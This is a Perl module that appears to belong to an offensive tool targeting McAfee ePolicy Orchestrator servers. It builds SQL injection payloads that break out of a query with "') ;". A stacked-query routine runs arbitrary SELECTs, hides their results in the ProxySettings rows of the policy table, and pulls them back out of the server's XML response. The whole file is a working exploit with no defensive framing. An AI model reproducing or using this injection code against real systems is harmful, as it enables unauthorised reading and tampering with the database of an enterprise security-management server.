package Epowner::Epo;

use Text::SimpleTable;

use strict;
use warnings;



sub sql_prepare_generic {
	my $this = shift;
        my $statement = shift;
        my $sqli =  "') ; " . $statement . " -- ";
        return $sqli;
}

sub sql_prepare_select{

        my $this = shift;
	my $select = shift;

        my $sqli =

## Here is how we retrieve the output of a SELECT query.. See also README.
## NOTE: Do not put any breakline !

"') ; " .
#Delete old epowner entries 
"delete from dbo.EPOPolicySettingValues where SettingName like 'epowner_data%'; " .

# PolicySettings Temp : Get the PolicySettingsID which holds 'ProxySettings' values
"declare \@TempPolTbl Table (RowId int identity, PolicySettingsID int); " .
"insert into \@TempPolTbl Select distinct PolicySettingsID from dbo.EPOPolicySettingValues WHERE SectionName='ProxySettings'; " .
"declare \@TempPolicyCount Int; " .
"set \@TempPolicyCount = (Select Count(PolicySettingsID) From \@TempPolTbl); " .


# Result Temp table : Read what we want to retrieve, and store it into a temp table
"declare \@TempResultTbl2 Table (RowId int identity, ResultValue varchar(3000)); " .
"insert into \@TempResultTbl2 (ResultValue) $select ;" .
"declare \@TempResultCount Int; " .
"set \@TempResultCount = (Select Count(ResultValue) From \@TempResultTbl2); " .


#some indexes for looping
"declare \@PolIndex Int; " .
"declare \@ResIndex Int; " .

"declare \@GetPolId int; " .
"declare \@GetResVal varchar(3000); " .
"declare \@SettingName varchar(64); " .

# loop : For each row we want to retrieve
"set \@ResIndex = 1; " .
"while(\@TempResultCount >= \@ResIndex) " .
"begin " .
        # get the row
"       set \@GetResVal = (select ResultValue from \@TempResultTbl2 where RowId = \@ResIndex); " .

        # loop : for each policy
"       set \@PolIndex = 1; " .
"       while(\@TempPolicyCount >= \@PolIndex) " .
"       begin " .
                # add it
"               set \@GetPolId = (select PolicySettingsID from \@TempPolTbl where RowId = \@PolIndex);  " .
"               set \@SettingName = 'epowner_data_' + cast(\@ResIndex as varchar(10));  " .
"               insert into EPOPolicySettingValues (PolicySettingsID,SectionName,SettingName,SettingValue) values (\@GetPolId, 'ProxySettings', \@SettingName, \@GetResVal); " .
"               set \@PolIndex = \@PolIndex + 1; " .
"       end " .

"       set \@ResIndex = \@ResIndex + 1; " .
"end " .
" -- ";

        return $sqli
}


sub sql_execute {

	# 1) Send HTTP request 
	# 2) parse XML response 
	# 3) extract "epowner_data" XML tags


	my $this = shift;
	my $sqli = shift;


	# Send the HTTP request
        my $http_request = $this->mode_common_generate_fullprops_request($sqli);
        my $http_response;
	if($http_response = $this->send_http_request($http_request)){
        }else{
                exit;
        }

	# parse HTTP response ($hash is really  a hash)
	my $post_hash = $this->parse_http_response($http_response);
	my %post = %$post_hash;

	# parse data
	my $data_hash = $this->parse_data_response($post{'data'} );
	my %data = %$data_hash;

	# parse server.xml and extract epowner_data_xxx
	my @results = $this->parse_server_xml($data{'server_xml'});
	
	return (@results);
	
}


1;
